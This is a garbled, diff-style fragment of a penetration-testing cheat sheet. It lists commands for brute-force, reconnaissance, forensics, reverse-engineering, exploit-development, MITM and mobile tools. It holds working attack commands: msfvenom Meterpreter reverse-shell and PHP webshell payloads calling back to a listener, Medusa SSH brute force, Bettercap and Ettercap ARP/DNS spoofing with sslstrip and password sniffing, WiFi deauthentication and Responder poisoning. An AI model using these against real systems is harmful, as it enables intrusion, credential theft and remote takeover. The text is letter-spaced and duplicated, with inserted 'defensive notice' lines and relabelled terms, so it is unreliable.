-m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - U  u s e r s . t x t  - P  p a s s w o r d s . t x t  - M  s s h  - M  f t p  - M  t e l n e t  
-V u l n e r a b i l i t y  A n a l y s i s  T o o l s  
-21. OpenVAS  
-Comprehensivevulnerability scanner:  
-
-22. Lynis  
-23. Wapiti  
-Securityauditing tool for Unix/Linux:  
-Webapplication vulnerability scanner:  
-#  B a s i c  s c a n
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  
-#  S c a n  w i t h  a u t h e n t i c a t i o n
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  - a  " u s e r n a m e % p a s s w o r d "  
-#  S p e c i f i c  m o d u l e s
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  - m  " s q l , x s s , f i l e "  
-#  S e t  c o o k i e
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  - c  " s e s s i o n = a b c 1 2 3 "  
-#  P r o x y  u s a g e
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  - p  h t t p : / / 1 2 7 . 0 . 0 . 1 : 8 0 8 0  
-#  O u t p u t  f o r m a t s
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  - f  h t m l  - o  r e p o r t . h t m l  
-#  S c o p e  l i m i t a t i o n  
-#  S y s t e m  a u d i t
-l y n i s  a u d i t  s y s t e m  
-#  R e m o t e  s y s t e m  a u d i t
-l y n i s  a u d i t  s y s t e m  r e m o t e  1 9 2 . 1 6 8 . 1 . 1 0 0  
-#  C u s t o m  p r o f i l e
-l y n i s  a u d i t  s y s t e m  - - p r o f i l e  / p a t h / t o / c u s t o m . p r f  
-#  S p e c i f i c  t e s t s  o n l y
-l y n i s  a u d i t  s y s t e m  - - t e s t s  " B O O T - 5 1 2 2  B O O T - 5 1 5 5  B O O T - 5 1 7 7 "  
-#  G e n e r a t e  r e p o r t
-l y n i s  a u d i t  s y s t e m  - - r e p o r t - f i l e  / t m p / l y n i s - r e p o r t . t x t  
-#  P e n t e s t  m o d e
-l y n i s  a u d i t  s y s t e m  - - p e n t e s t  
-#  Q u i c k  m o d e
-l y n i s  a u d i t  s y s t e m  - - q u i c k  
-
-#  L a u n c h  R e c o n - n g
-r e c o n - n g  
-#  W o r k s p a c e  m a n a g e m e n t
-w o r k s p a c e s  c r e a t e  t a r g e t _ r e c o n
-w o r k s p a c e s  s e l e c t  t a r g e t _ r e c o n  
-#  A d d  d o m a i n s
-d b  i n s e r t  d o m a i n s  d o m a i n = t a r g e t . c o m  
-#  M o d u l e  u s a g e  m o d u l e s  s e a r c h  m o d u l e s  l o a d
+r e p o r t _ i d "
+m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  a d m i n  - P  p a s s w o r d s . t x t  - M  s s h
+# Multiple hosts
+medusa - H h o s t s . t x t - u admin - P p a s s w o r d s . t x t - M ssh
+# Custom port and threads
+m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - n  2 2 2 2  - u  r o o t  - P  p a s s w o r d s . t x t  - t  1 0  - M  s s h
+# Stop on success
+m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  a d m i n  - P  p a s s w o r d s . t x t  - M  s s h  - f
+# Test specific credentials
+m e d u s a  - h  1 9 2 . 1 6 8 . 1 . 1 0 0  - u  a d m i n  - p  p a s s w o r d 1 2 3  - M  s s h
+# Multiple services scan
+medusa - h 1 9 2 . 1 6 8 . 1 . 1 0 0 - U u s e r s . t x t - P p a s s w o r d s . t x t - M ssh - M ftp - M telnet
+Vulnerability Analysis Tools
+21. OpenVAS
+Comprehensivevulnerability scanner:
+22. Lynis
+23. Wapiti
+Securityauditing tool for Unix/Linux:
+Webapplication vulnerability scanner:
+# Basic scan
+w a p i t i  - u  h t t p : / / t a r g e t . c o m
+# Scan with authentication
+w a p i t i  - u  h t t p : / / t a r g e t . c o m  - a  " u s e r n a m e % p a s s w o r d "
+# Specific modules
+w a p i t i  - u  h t t p : / / t a r g e t . c o m  - m  " s q l , x s s , f i l e "
+# Set cookie
+w a p i t i  - u  h t t p : / / t a r g e t . c o m  - c  " s e s s i o n = a b c 1 2 3 "
+# Proxy usage
+w a p i t i  - u  h t t p : / / t a r g e t . c o m  - p  h t t p : / / 1 2 7 . 0 . 0 . 1 : 8 0 8 0
+# Output formats
+w a p i t i  - u  h t t p : / / t a r g e t . c o m  - f  h t m l  - o  r e p o r t . h t m l
+# Scope limitation
+# System audit
+lynis audit system
+# Remote system audit
+l y n i s  a u d i t  s y s t e m  r e m o t e  1 9 2 . 1 6 8 . 1 . 1 0 0
+# Custom profile
+l y n i s  a u d i t  s y s t e m  - - p r o f i l e  / p a t h / t o / c u s t o m . p r f
+# Specific tests only
+l y n i s  a u d i t  s y s t e m  - - t e s t s  " B O O T - 5 1 2 2  B O O T - 5 1 5 5  B O O T - 5 1 7 7 "
+# Generate report
+l y n i s  a u d i t  s y s t e m  - - r e p o r t - f i l e  / t m p / l y n i s - r e p o r t . t x t
+# Pentest mode
+lynis audit system - - p e n t e s t
+# Quick mode
+lynis audit system - - q u i c k
+# Launch R e c o n - n g
+r e c o n - n g
+# Workspace management
+workspaces create t a r g e t _ r e c o n
+workspaces select t a r g e t _ r e c o n
+# Add domains
+d b  i n s e r t  d o m a i n s  d o m a i n = t a r g e t . c o m
+# Module usage modules search modules load
 r e c o n / d o m a i n s - h o s t s / g o o g l e _ s i t e _ w e b  o p t i o n s  s e t
-S O U R C E  t a r g e t . c o m  r u n  
-#  A P I  k e y  m a n a g e m e n t  
-w a p i t i  - u  h t t p : / / t a r g e t . c o m  - s  h t t p : / / t a r g e t . c o m / a p p /  
-#  L a u n c h  M a l t e g o
-m a l t e g o  
+SOURCE t a r g e t . c o m run
+# API key management
+w a p i t i  - u  h t t p : / / t a r g e t . c o m  - s  h t t p : / / t a r g e t . c o m / a p p /
+# Launch Maltego
 #  T r a n s f o r m  e x e c u t i o n  v i a  c o m m a n d  l i n e  ( u s i n g  C a s e F i l e )
-c a s e f i l e  
-#  C o m m o n  t r a n s f o r m s :
-#  -  D o m a i n  t o  I P
-#  -  E m a i l  t o  P e r s o n
-#  -  P e r s o n  t o  P h o n e  N u m b e r
-#  -  C o m p a n y  t o  D o m a i n
-#  -  I P  t o  L o c a t i o n  
-#  A P I  i n t e g r a t i o n  f o r  a u t o m a t e d  t r a n s f o r m s
-#  C o n f i g u r e  i n  M a l t e g o  U I :  T r a n s f o r m s  - &gt;  T r a n s f o r m  H u b  
-F o r e n s i c s  a n d  I n f o r m a t i o n  G a t h e r i n g  T o o l s  
-24. Maltego  
-25. Recon-ng  
-Webreconnaissance framework:  
-Visuallinkanalysis and data mining tool:  
-
-#  B a s i c  s c a n
-d m i t r y  t a r g e t . c o m  
-#  A l l  m o d u l e s
-d m i t r y  - w i n s e  t a r g e t . c o m  
-#  S u b d o m a i n  s e a r c h
-d m i t r y  - s  t a r g e t . c o m  
-k e y s  a d d  s h o d a n _ a p i  X X X X X X X X X X X X X X X X
+casefile
+# Common t r a n s f o r m s :
+# - Domain to IP
+# - Email to Person
+# - Person to Phone Number
+# - Company to Domain
+# - IP to Location
+# API integration for automated transforms
+# Configure in Maltego U I : Transforms - &gt; Transform Hub
+Forensics and Information Gathering Tools
+24. Maltego
+25. Recon-ng
+Webreconnaissance framework:
+Visuallinkanalysis and data mining tool:
+# Basic scan
+dmitry t a r g e t . c o m
+# All modules
+dmitry - w i n s e t a r g e t . c o m
+# Subdomain search
+dmitry - s t a r g e t . c o m
+keys add s h o d a n _ a p i XXXXXXXXXXXXXXXX
 m o d u l e s  l o a d  r e c o n / h o s t s - p o r t s / s h o d a n _ i p
-r u n  
-#  R e p o r t i n g
+r u n
+# Reporting
 m o d u l e s  l o a d  r e p o r t i n g / h t m l
 o p t i o n s  s e t  F I L E N A M E  / t m p / r e c o n _ r e p o r t . h t m l
-r u n  
-#  B a s i c  d o m a i n  s e a r c h
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  g o o g l e  
-#  M u l t i p l e  s e a r c h  e n g i n e s
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  g o o g l e , b i n g , l i n k e d i n , t w i t t e r  
-#  L i m i t  r e s u l t s
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  a l l  - l  5 0 0  
-#  S a v e  r e s u l t s
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  a l l  - f  r e s u l t s . h t m l  
-#  D N S  b r u t e  f o r c e
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  a l l  - c  
-#  V i r t u a l  h o s t  v e r i f i c a t i o n
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  a l l  - v  
-#  S h o d a n  i n t e g r a t i o n
-t h e H a r v e s t e r  - d  t a r g e t . c o m  - b  s h o d a n  
-27. Dmitry  
-26. theHarvester  
-DeepmagicInformation Gathering Tool:  
-Email,subdomainandpeople names harvester:  
-
-#  E m a i l  s e a r c h
-d m i t r y  - e  t a r g e t . c o m  
-#  P o r t  s c a n
-d m i t r y  - p  t a r g e t . c o m  
-#  S a v e  o u t p u t
-d m i t r y  - o  o u t p u t . t x t  t a r g e t . c o m  
-#  C u s t o m  p o r t  r a n g e
-d m i t r y  - p  t a r g e t . c o m  - f  1  - t  1 0 0 0  
-#  C r e a t e  c a s e
-a u t o p s y  
-#  C o m m a n d - l i n e  t o o l s
-#  L i s t  p a r t i t i o n s
-m m l s  d i s k . i m g  
-#  F i l e  s y s t e m  a n a l y s i s
-f l s  - r  - p  d i s k . i m g  
-#  R e c o v e r  d e l e t e d  f i l e s
-t s k _ r e c o v e r  - e  d i s k . i m g  r e c o v e r e d _ f i l e s /  
-#  T i m e l i n e  c r e a t i o n
-f l s  - r  - m  " / "  d i s k . i m g  &gt;  t i m e l i n e . b o d y
-m a c t i m e  - b  t i m e l i n e . b o d y  - d  &gt;  t i m e l i n e . c s v  
-#  S t r i n g  s e a r c h
-s t r i n g s  - a  d i s k . i m g  |  g r e p  - i  p a s s w o r d  
-#  H a s h  c a l c u l a t i o n
-m d 5 s u m  d i s k . i m g
-s h a 2 5 6 s u m  d i s k . i m g  
-28. Forensics Toolkit (Autopsy/Sleuth Kit)  
-Digitalforensicsplatform:
-
-R e v e r s e  E n g i n e e r i n g  T o o l s  
-29. Ghidra  
-30. Radare2  
-NSA'sreverseengineering framework:  
-Advancedcommand-line reverse engineering framework:  
-#  O p e n  b i n a r y
-r 2  b i n a r y  
-#  A n a l y s i s
-a a a  
-#  L i s t  f u n c t i o n s
-a f l  
-#  D i s a s s e m b l e  f u n c t i o n
-p d f  @  m a i n  
-#  V i s u a l  m o d e  
-V  
-#  D e b u g  m o d e  
-#  L a u n c h  G h i d r a
-g h i d r a  
-#  H e a d l e s s  a n a l y s i s
-a n a l y z e H e a d l e s s  / p a t h / t o / p r o j e c t  P r o j e c t N a m e  - i m p o r t  / p a t h / t o / b i n a r y  - s c r i p t P a t h
-/ p a t h / t o / s c r i p t s  - p o s t S c r i p t  S c r i p t N a m e . j a v a  
-#  C o m m o n  a n a l y s i s  t a s k s :
-#  -  D i s a s s e m b l y  #  -
-D e c o m p i l a t i o n  #  -  S t r i n g
-s e a r c h  #  -  F u n c t i o n
-g r a p h  #  -  C r o s s -
-r e f e r e n c e s  #  -  D a t a  t y p e
-m a n a g e m e n t  
-#  P y t h o n  s c r i p t i n g  e x a m p l e
-#  f r o m  g h i d r a . a p p . s c r i p t  i m p o r t  G h i d r a S c r i p t
-#  d e f  r u n ( ) :  
-#
-#  
-f u n c t i o n  =  g e t F u n c t i o n C o n t a i n i n g ( c u r r e n t A d d r e s s )
-p r i n t ( " F u n c t i o n :  "  +  f u n c t i o n . g e t N a m e ( ) )  
-
-r 2  - d  b i n a r y  
-#  W e b  i n t e r f a c e
-r 2  - c = H  b i n a r y  
-#  S e a r c h  s t r i n g s
-i z  
-#  S e a r c h  o p c o d e s
-/ x  9 0 9 0 9 0 9 0  
-#  C r o s s - r e f e r e n c e s
-a x t  @  0 x 0 8 0 4 8 0 0 0  
-#  B i n a r y  p a t c h i n g
-w x  9 0 9 0  @  0 x 0 8 0 4 8 0 0 0  
-#  S t a r t  G D B  w i t h  P E D A
-g d b  b i n a r y  
-#  S e t  b r e a k p o i n t
-b r e a k  m a i n
-b r e a k  * 0 x 0 8 0 4 8 0 0 0  
-#  R u n  p r o g r a m
 r u n
-r u n  $ ( p y t h o n  - c  ' p r i n t  " A " * 1 0 0 ' )  
-#  E x a m i n e  m e m o r y
+# Basic domain search
+theHarvester - d t a r g e t . c o m - b google
+# Multiple search engines
+theHarvester - d t a r g e t . c o m - b g o o g l e , b i n g , l i n k e d i n , t w i t t e r
+# Limit results
+theHarvester - d t a r g e t . c o m - b all - l 5 0 0
+# Save results
+theHarvester - d t a r g e t . c o m - b all - f r e s u l t s . h t m l
+# DNS brute force
+theHarvester - d t a r g e t . c o m - b all - c
+# Virtual host verification
+theHarvester - d t a r g e t . c o m - b all - v
+# Shodan integration
+theHarvester - d t a r g e t . c o m - b shodan
+27. Dmitry
+26. theHarvester
+DeepmagicInformation Gathering Tool:
+Email,subdomainandpeople names harvester:
+# Email search
+dmitry - e t a r g e t . c o m
+# Port scan
+dmitry - p t a r g e t . c o m
+# Save output
+dmitry - o o u t p u t . t x t t a r g e t . c o m
+# Custom port range
+dmitry - p t a r g e t . c o m - f 1 - t 1 0 0 0
+# Create case
+autopsy
+# C o m m a n d - l i n e tools
+# List partitions
+mmls d i s k . i m g
+# File system analysis
+fls - r - p d i s k . i m g
+# Recover deleted files
+t s k _ r e c o v e r  - e  d i s k . i m g  r e c o v e r e d _ f i l e s /
+# Timeline creation
+f l s  - r  - m  " / "  d i s k . i m g  &gt;  t i m e l i n e . b o d y
+mactime - b t i m e l i n e . b o d y - d &gt; t i m e l i n e . c s v
+# String search
+s t r i n g s  - a  d i s k . i m g  |  g r e p  - i  p a s s w o r d
+# Hash calculation
+m d 5 s u m d i s k . i m g
+s h a 2 5 6 s u m d i s k . i m g
+28. Forensics Toolkit (Autopsy/Sleuth Kit)
+Digitalforensicsplatform:
+Reverse Engineering Tools
+29. Ghidra
+30. Radare2
+NSA'sreverseengineering framework:
+Advancedcommand-line reverse engineering framework:
+# Open binary
+r 2 binary
+# Analysis
+a a a
+# List functions
+a f l
+# Disassemble function
+pdf @ main
+# Visual mode
+V
+# Debug mode
+# Launch Ghidra
+# Headless analysis
+a n a l y z e H e a d l e s s  / p a t h / t o / p r o j e c t  P r o j e c t N a m e  - i m p o r t  / p a t h / t o / b i n a r y  - s c r i p t P a t h
+/ p a t h / t o / s c r i p t s  - p o s t S c r i p t  S c r i p t N a m e . j a v a
+# Common analysis t a s k s :
+# - Disassembly # -
+Decompilation # - String
+search # - Function
+graph # - C r o s s -
+references # - Data type
+management
+# Python scripting example
+# from g h i d r a . a p p . s c r i p t import GhidraScript
+#  d e f  r u n ( ) :
+f u n c t i o n  =  g e t F u n c t i o n C o n t a i n i n g ( c u r r e n t A d d r e s s )
+p r i n t ( " F u n c t i o n :  "  +  f u n c t i o n . g e t N a m e ( ) )
+r 2 - d binary
+# Web interface
+r 2  - c = H  b i n a r y
+# Search strings
+i z
+# Search opcodes
+/ x  9 0 9 0 9 0 9 0
+# C r o s s - r e f e r e n c e s
+a x t  @  0 x 0 8 0 4 8 0 0 0
+# Binary patching
+w x  9 0 9 0  @  0 x 0 8 0 4 8 0 0 0
+# Start GDB with PEDA
+gdb binary
+# Set breakpoint
+break main
+b r e a k  * 0 x 0 8 0 4 8 0 0 0
+# Run program
+r u n
+r u n  $ ( p y t h o n  - c  ' p r i n t  " A " * 1 0 0 ' )
+# Examine memory
 x / 1 0 x  $ e s p
 x / 1 0 s  0 x 0 8 0 4 8 0 0 0
-x / 1 0 i  $ e i p  
-#  P E D A  c o m m a n d s
-c h e c k s e c
-p a t t e r n  c r e a t e  1 0 0
+x / 1 0 i  $ e i p
+# PEDA commands
+checksec
+pattern create 1 0 0
 p a t t e r n  o f f s e t  0 x 4 1 4 1 4 1 4 1
 s e a r c h m e m  " / b i n / s h "
-r o p g a d g e t  
-#  P r o c e s s  i n f o r m a t i o n
-i n f o  r e g i s t e r s
-i n f o  p r o c  m a p p i n g s
-i n f o  f u n c t i o n s  
-31. GDB (with PEDA/GEF/pwndbg)  
+ropgadget
+# Process information
+info registers
+info proc mappings
+info functions
+31. GDB (with PEDA/GEF/pwndbg)
 Enhanceddebuggerfor  reverseengineering:
-
-#  B a s i c  s e a r c h  
-
-#  S t e p p i n g  s i  #  s t e p
-i n s t r u c t i o n  n i  #  n e x t
-i n s t r u c t i o n  c o n t i n u e  
-#  L i s t  p a y l o a d s
-m s f v e n o m  - l  p a y l o a d s  
-#  W i n d o w s  r e v e r s e  s h e l l
+# Basic search
+# Stepping si # step
+instruction ni # next
+instruction continue
+# List test vectors
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
+# Windows unauthorized remote shell activity
 m s f v e n o m  - p  w i n d o w s / x 6 4 / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4
-- f  e x e  &gt;  s h e l l . e x e  
-#  L i n u x  r e v e r s e  s h e l l
+- f exe &gt; s h e l l . e x e
+# Linux unauthorized remote shell activity
 m s f v e n o m  - p  l i n u x / x 8 6 / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4  - f
-e l f  &gt;  s h e l l . e l f  
-#  P H P  w e b s h e l l
+elf &gt; s h e l l . e l f
+# PHP webshell
 m s f v e n o m  - p  p h p / m e t e r p r e t e r _ r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4  - f  r a w &gt;
-s h e l l . p h p  
-#  E n c o d e d  p a y l o a d
+s h e l l . p h p
+# Encoded test vectors
 m s f v e n o m  - p  w i n d o w s / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4  - e
-x 8 6 / s h i k a t a _ g a _ n a i  - i  5  - f  e x e  &gt;  e n c o d e d . e x e  
-#  M u l t i p l e  f o r m a t s
+x 8 6 / s h i k a t a _ g a _ n a i  - i  5  - f  e x e  &gt;  e n c o d e d . e x e
+# Multiple formats
 m s f v e n o m  - p  w i n d o w s / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4  - f  c
 m s f v e n o m  - p  w i n d o w s / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4  - f
-p y t h o n  
-#  B a d  c h a r a c t e r  e x c l u s i o n
+python
+# Bad character exclusion
 m s f v e n o m  - p  w i n d o w s / m e t e r p r e t e r / r e v e r s e _ t c p  L H O S T = 1 9 2 . 1 6 8 . 1 . 1 0 0  L P O R T = 4 4 4 4  - b
-' \ x 0 0 \ x 0 a \ x 0 d '  - f  e x e  &gt;  c l e a n . e x e  
-E x p l o i t a t i o n  D e v e l o p m e n t  T o o l s  
-32. MSFVenom  
-33. Searchsploit  
-Exploitdatabasesearch tool:  
-Payloadgeneratorand encoder:  
-
-s e a r c h s p l o i t  a p a c h e  2 . 4  
-#  D e t a i l e d  s e a r c h
-s e a r c h s p l o i t  - t  a p a c h e  |  g r e p  - i  " d e n i a l "  
-#  C o p y  e x p l o i t  t o  c u r r e n t  d i r e c t o r y
-s e a r c h s p l o i t  - m  1 2 3 4 5  
-#  E x a m i n e  e x p l o i t
-s e a r c h s p l o i t  - x  1 2 3 4 5  
-#  U p d a t e  d a t a b a s e
-s e a r c h s p l o i t  - u  
-#  C a s e  s e n s i t i v e  s e a r c h
-s e a r c h s p l o i t  - s  A p a c h e  
-#  E x c l u d e  t e r m s
-s e a r c h s p l o i t  a p a c h e  - - e x c l u d e = " p h p "  
-#  J S O N  o u t p u t
-s e a r c h s p l o i t  - - j s o n  a p a c h e  &gt;  r e s u l t s . j s o n  
-#  C r e a t e  p a t t e r n
-p a t t e r n _ c r e a t e  - l  1 0 0 0  
-#  M S F  p a t t e r n  c r e a t e
-/ u s r / s h a r e / m e t a s p l o i t - f r a m e w o r k / t o o l s / e x p l o i t / p a t t e r n _ c r e a t e . r b  - l  1 0 0 0  
-#  F i n d  o f f s e t
-p a t t e r n _ o f f s e t  - q  0 x 4 1 3 9 6 1 4 1  
-#  M S F  p a t t e r n  o f f s e t
-/ u s r / s h a r e / m e t a s p l o i t - f r a m e w o r k / t o o l s / e x p l o i t / p a t t e r n _ o f f s e t . r b  - q  0 x 4 1 3 9 6 1 4 1  
-#  A l t e r n a t i v e  w i t h  P y t h o n
-p y t h o n  - c  " p r i n t ( ' A '  *  1 0 0  +  ' B '  *  4  +  ' C '  *  2 0 0 ) "  
-#  C y c l i c  p a t t e r n  w i t h  p w n t o o l s
+' \ x 0 0 \ x 0 a \ x 0 d '  - f  e x e  &gt;  c l e a n . e x e
+defensive validation Development Tools
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
+33. Searchsploit
+Exploitdatabasesearch tool:
+Payloadgeneratorand encoder:
+searchsploit apache 2 . 4
+# Detailed search
+s e a r c h s p l o i t  - t  a p a c h e  |  g r e p  - i  " d e n i a l "
+# Copy validate to current directory
+searchsploit - m 1 2 3 4 5
+# Examine validate
+searchsploit - x 1 2 3 4 5
+# Update database
+searchsploit - u
+# Case sensitive search
+searchsploit - s Apache
+# Exclude terms
+s e a r c h s p l o i t  a p a c h e  - - e x c l u d e = " p h p "
+# JSON output
+searchsploit - - j s o n apache &gt; r e s u l t s . j s o n
+# Create pattern
+p a t t e r n _ c r e a t e - l 1 0 0 0
+# MSF pattern create
+/ u s r / s h a r e / m e t a s p l o i t - f r a m e w o r k / t o o l s / e x p l o i t / p a t t e r n _ c r e a t e . r b  - l  1 0 0 0
+# Find offset
+p a t t e r n _ o f f s e t  - q  0 x 4 1 3 9 6 1 4 1
+# MSF pattern offset
+/ u s r / s h a r e / m e t a s p l o i t - f r a m e w o r k / t o o l s / e x p l o i t / p a t t e r n _ o f f s e t . r b  - q  0 x 4 1 3 9 6 1 4 1
+# Alternative with Python
+p y t h o n  - c  " p r i n t ( ' A '  *  1 0 0  +  ' B '  *  4  +  ' C '  *  2 0 0 ) "
+# Cyclic pattern with pwntools
 p y t h o n 3  - c  " f r o m  p w n  i m p o r t  * ;  p r i n t ( c y c l i c ( 1 0 0 0 ) ) "
-p y t h o n 3  - c  " f r o m  p w n  i m p o r t  * ;  p r i n t ( c y c l i c _ f i n d ( 0 x 6 1 6 1 6 1 7 4 ) ) "  
-34. Pattern Create/Offset  
+p y t h o n 3  - c  " f r o m  p w n  i m p o r t  * ;  p r i n t ( c y c l i c _ f i n d ( 0 x 6 1 6 1 6 1 7 4 ) ) "
+34. Pattern Create/Offset
 Buffer  overflow  development  tools:
-
-N e t w o r k  S p o o f i n g  a n d  M I T M  T o o l s  
-35. Ettercap  
-36. Bettercap  
-ModernMITMframework:  
-Comprehensivesuite for MITM attacks:  
-#  I n t e r a c t i v e  m o d e
-b e t t e r c a p  
-#  N e t w o r k  r e c o n
-n e t . p r o b e  o n
-n e t . s h o w  
-#  A R P  s p o o f i n g
+Network Spoofing and MITM Tools
+35. Ettercap
+36. Bettercap
+ModernMITMframework:
+Comprehensivesuite for MITM security test:
+# Interactive mode
+bettercap
+# Network recon
+n e t . p r o b e on
+n e t . s h o w
+# ARP spoofing
 s e t  a r p . s p o o f . t a r g e t s  1 9 2 . 1 6 8 . 1 . 1 0 0
-a r p . s p o o f  o n  
-#  D N S  s p o o f i n g
-s e t  d n s . s p o o f . d o m a i n s  * . t a r g e t . c o m
+a r p . s p o o f on
+# DNS spoofing
+set d n s . s p o o f . d o m a i n s * . t a r g e t . c o m
 s e t  d n s . s p o o f . a d d r e s s  1 9 2 . 1 6 8 . 1 . 2 0 0
-d n s . s p o o f  o n  
-#  G r a p h i c a l  i n t e r f a c e
-e t t e r c a p  - G  
-#  T e x t  i n t e r f a c e
-e t t e r c a p  - T  - M  a r p : r e m o t e  / 1 9 2 . 1 6 8 . 1 . 1 / /  / 1 9 2 . 1 6 8 . 1 . 1 0 0 / /  
-#  S n i f f  a l l  t r a f f i c
-e t t e r c a p  - T  - M  a r p : r e m o t e  / / /  
-#  P l u g i n  u s a g e
-e t t e r c a p  - T  - P  d n s _ s p o o f  - M  a r p : r e m o t e  / 1 9 2 . 1 6 8 . 1 . 1 / /  / 1 9 2 . 1 6 8 . 1 . 1 0 0 / /  
-#  P a s s i v e  s c a n n i n g
-e t t e r c a p  - T  - p  
-#  F i l t e r  u s a g e
-e t t e r f i l t e r  f i l t e r . e f  - o  f i l t e r . e f
-e t t e r c a p  - T  - F  f i l t e r . e f  - M  a r p : r e m o t e  / / /  
-#  L o g  t r a f f i c
-e t t e r c a p  - T  - L  l o g f i l e  - M  a r p : r e m o t e  / / /  
-
+d n s . s p o o f on
+# Graphical interface
+ettercap - G
+# Text interface
+e t t e r c a p  - T  - M  a r p : r e m o t e  / 1 9 2 . 1 6 8 . 1 . 1 / /  / 1 9 2 . 1 6 8 . 1 . 1 0 0 / /
+# Sniff all traffic
+e t t e r c a p  - T  - M  a r p : r e m o t e  / / /
+# Plugin usage
+e t t e r c a p  - T  - P  d n s _ s p o o f  - M  a r p : r e m o t e  / 1 9 2 . 1 6 8 . 1 . 1 / /  / 1 9 2 . 1 6 8 . 1 . 1 0 0 / /
+# Passive scanning
+ettercap - T - p
+# Filter usage
+etterfilter f i l t e r . e f - o f i l t e r . e f
+e t t e r c a p  - T  - F  f i l t e r . e f  - M  a r p : r e m o t e  / / /
+# Log traffic
+e t t e r c a p  - T  - L  l o g f i l e  - M  a r p : r e m o t e  / / /
 #  H T T P / H T T P S  p r o x y
-s e t  h t t p . p r o x y . s s l s t r i p  t r u e
-h t t p . p r o x y  o n  
-#  C a p t u r e  c r e d e n t i a l s
+set h t t p . p r o x y . s s l s t r i p true
+h t t p . p r o x y on
+# Capture credentials
 s e t  n e t . s n i f f . r e g e x p  ' . * p a s s w o r d = . + '
-n e t . s n i f f  o n  
-#  W i F i  a t t a c k s
-w i f i . r e c o n  o n
+n e t . s n i f f on
+# WiFi security test
+w i f i . r e c o n on
 w i f i . s h o w
-w i f i . d e a u t h  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5  
-#  B a s i c  u s a g e
-r e s p o n d e r  - I  e t h 0  
-#  F o r c e  W P A D  a u t h e n t i c a t i o n
-r e s p o n d e r  - I  e t h 0  - w F  
-#  S p e c i f i c  p r o t o c o l s
-r e s p o n d e r  - I  e t h 0  - - l m  - - d i s a b l e - e s s  
-#  A n a l y z e  m o d e
-r e s p o n d e r  - I  e t h 0  - A  
-#  V e r b o s e  m o d e
-r e s p o n d e r  - I  e t h 0  - v  
-#  C u s t o m  c h a l l e n g e
-r e s p o n d e r  - I  e t h 0  - - l m - c h a l l e n g e  1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8  
-#  F i n g e r p r i n t  m o d e
-r e s p o n d e r  - I  e t h 0  - f  
-37. Responder  
-LLMNR,NBT-NSand MDNS poisoner:  
-
-M o b i l e  S e c u r i t y  T e s t i n g  T o o l s  
-38. Android Debug Bridge (ADB)  
-39. MobSF (Mobile Security Framework)  
+w i f i . d e a u t h  0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5
+# Basic usage
+responder - I e t h 0
+# Force WPAD authentication
+responder - I e t h 0 - w F
+# Specific protocols
+responder - I e t h 0 - - l m - - d i s a b l e - e s s
+# Analyze mode
+responder - I e t h 0 - A
+# Verbose mode
+responder - I e t h 0 - v
+# Custom challenge
+r e s p o n d e r  - I  e t h 0  - - l m - c h a l l e n g e  1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8
+# Fingerprint mode
+responder - I e t h 0 - f
+37. Responder
+LLMNR,NBT-NSand MDNS poisoner:
+Mobile Security Testing Tools
+38. Android Debug Bridge (ADB)
+39. MobSF (Mobile Security Framework)
 Androiddeviceinteractiontool:
 Automatedmobileappsecuritytesting:
-#  L i s t  d e v i c e s
-a d b  d e v i c e s  
-#  S h e l l  a c c e s s
-a d b  s h e l l  
-#  I n s t a l l  A P K
-a d b  i n s t a l l  a p p . a p k  
-#  P u l l  f i l e s
-a d b  p u l l  / d a t a / d a t a / c o m . a p p / d a t a b a s e s / a p p . d b  
-#  P u s h  f i l e s
-a d b  p u s h  f i l e . t x t  / s d c a r d /  
-#  L o g c a t
-a d b  l o g c a t  |  g r e p  - i  p a s s w o r d  
-#  S c r e e n  c a p t u r e
-a d b  s h e l l  s c r e e n c a p  / s d c a r d / s c r e e n . p n g  
-#  P a c k a g e  m a n a g e m e n t
-a d b  s h e l l  p m  l i s t  p a c k a g e s
-a d b  s h e l l  p m  p a t h  c o m . e x a m p l e . a p p  
-#  A c t i v i t y  m a n a g e r
-a d b  s h e l l  a m  s t a r t  - n  c o m . e x a m p l e . a p p / . M a i n A c t i v i t y  
-#  S t a r t  M o b S F
-m o b s f  
-#  A P I  u s a g e  f o r  a u t o m a t i o n
-#  U p l o a d  A P K
+# List devices
+adb devices
+# Shell access
+adb shell
+# Install APK
+adb install a p p . a p k
+# Pull files
+a d b  p u l l  / d a t a / d a t a / c o m . a p p / d a t a b a s e s / a p p . d b
+# Push files
+a d b  p u s h  f i l e . t x t  / s d c a r d /
